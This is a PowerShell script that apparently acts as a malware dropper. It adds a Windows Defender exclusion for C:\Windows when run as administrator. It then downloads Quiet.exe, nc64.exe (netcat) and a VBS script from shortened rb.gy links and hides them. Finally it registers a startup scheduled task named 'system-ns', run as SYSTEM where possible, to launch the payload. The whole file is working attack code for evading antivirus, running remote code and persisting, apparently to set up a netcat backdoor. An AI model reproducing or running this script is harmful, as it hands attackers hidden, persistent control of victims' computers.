# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::New([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn’t exist
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath

# Make the downloaded files hidden
attrib +H $quietTxtPath
attrib +H $nc64TxtPath
attrib +H $scriptVbsPath

# Create a scheduled task
$action = New-ScheduledTaskAction -Execute $scriptVbsPath
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

try {
    $taskName = "system-ns"
    $taskPath = "\MyTasks\"  # Custom subfolder for non-admin users

    if ($isAdmin) {
        # Admin: Register in root with SYSTEM account
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath "\" -Principal $principal -Settings $settings -Force
        Start-ScheduledTask -TaskName $taskName -TaskPath "\"
    } else {
        # Non-Admin: Register in custom subfolder with current user
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath $taskPath -Principal $principal -Settings $settings -Force
        Start-ScheduledTask -TaskName $taskName -TaskPath $taskPath
    }
    Write-Output "Task registered and started successfully."
} catch {
    Write-Output "Failed to register or start the scheduled task: $_"
}
